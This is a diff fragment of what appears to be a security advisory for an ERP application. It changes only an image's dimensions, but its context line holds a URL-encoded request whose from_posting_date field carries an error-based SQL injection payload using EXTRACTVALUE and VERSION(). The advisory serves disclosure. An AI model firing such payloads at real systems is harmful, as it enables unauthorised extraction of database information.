@@ -236,4 +236,4 @@ Priority: u=0
 args=%7b%20%20%22posting_date%22%3a%222025-07-15%22%2c%20%20%22company%22%3a%22A%22%2c%20%20%22party_type%22%3a%22Supplier%22%2c%20%20%22payment_type%22%3a%22Pay%22%2c%20%20%22party%22%3a%22SUP-0001%22%2c%20%20%22party_account%22%3a%22Creditors%20-%20A%22%2c%20%20%22from_posting_date%22%3a%222025-06-15'%20AND%20EXTRACTVALUE(1%2c%20CONCAT(0x7e%2c%20VERSION()%2c%200x7e))%20--%20%22%2c%20%20%22to_posting_date%22%3a%222025-07-15%22%2c%20%20%22outstanding_amt_greater_than%22%3a0%2c%20%20%22allocate_payment_amount%22%3a1%2c%20%20%22get_outstanding_invoices%22%3atrue%7d
 ```
 
-<img width="1899" height="696" alt="image" src="https://github.com/user-attachments/assets/eabe0029-7872-4548-a8a9-57af19519812" />
+<img width="1500" height="500" alt="image" src="https://github.com/user-attachments/assets/eabe0029-7872-4548-a8a9-57af19519812" />
